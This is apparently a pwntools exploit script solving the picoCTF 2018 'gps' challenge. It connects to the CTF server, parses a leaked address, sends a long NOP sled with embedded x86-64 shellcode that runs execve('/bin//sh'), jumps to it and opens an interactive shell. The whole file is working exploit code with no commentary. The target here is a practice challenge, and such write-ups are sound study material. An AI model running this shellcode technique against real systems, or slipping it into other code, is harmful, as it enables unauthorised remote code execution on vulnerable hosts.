from pwn import *

#r = process('./gps')
r = remote('2018shell.picoctf.com', 49351)

shellcode = '\x48\x31\xF6\x48\x31\xD2\x56\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x48\x31\xC0\x48\x83\xF0\x3B\x0F\x05'

nop_addr = int(r.recvuntil('\nWhat\'s your plan?').split('\nWhat\'s your plan?')[0].split('Current position: ')[1], 16) + 0x400

r.sendafter('> ', '\x90'*(0xfff - len(shellcode)) + shellcode)

log.info('Jumping to ' + hex(nop_addr))

pause()

r.sendafter('> ', hex(nop_addr) + '\n')

r.interactive()